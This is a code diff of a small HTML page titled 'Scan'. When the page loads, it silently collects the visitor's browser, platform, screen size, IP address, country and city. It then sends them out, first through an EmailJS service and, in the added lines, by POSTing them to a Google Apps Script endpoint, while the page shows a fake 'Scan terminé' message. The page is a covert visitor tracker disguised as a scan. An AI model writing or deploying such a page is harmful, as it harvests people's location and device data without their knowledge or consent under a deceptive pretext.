@@ -3,48 +3,39 @@
 <head>
 <meta charset="UTF-8">
 <title>Scan</title>
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-(function(){
-  emailjs.init("KlvT7DPiJ8nOZyAxK");
-})();
-</script>
 </head>
-
 <body>
-<h3>Chargement...</h3>
+<h3>Scan en cours…</h3>
 
 <script>
-async function sendEmail() {
-    let data = {
-        user_agent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: screen.width + "x" + screen.height,
-        date: new Date().toLocaleString(),
-        country: "inconnu",
-        city: "inconnu",
-        ip: "inconnu"
-    };
+async function sendData() {
+  let data = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screen: screen.width + "x" + screen.height,
+    country: "",
+    city: "",
+    ip: ""
+  };
 
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const ipData = await res.json();
-        data.country = ipData.country_name;
-        data.city = ipData.city;
-        data.ip = ipData.ip;
-    } catch(e) {}
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const ipData = await res.json();
+    data.country = ipData.country_name;
+    data.city = ipData.city;
+    data.ip = ipData.ip;
+  } catch(e) {}
 
-    emailjs.send(
-        "service_2wvpbrm",
-        "template_j1dedzh",
-        data
-    );
+  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec", {
+    method: "POST",
+    body: JSON.stringify(data)
+  });
 
-    document.body.innerHTML = "<h3>Merci 👍</h3>";
+  document.body.innerHTML = "<h3>Scan terminé ✅</h3>";
 }
 
-sendEmail();
+sendData();
 </script>
 </body>
 </html>
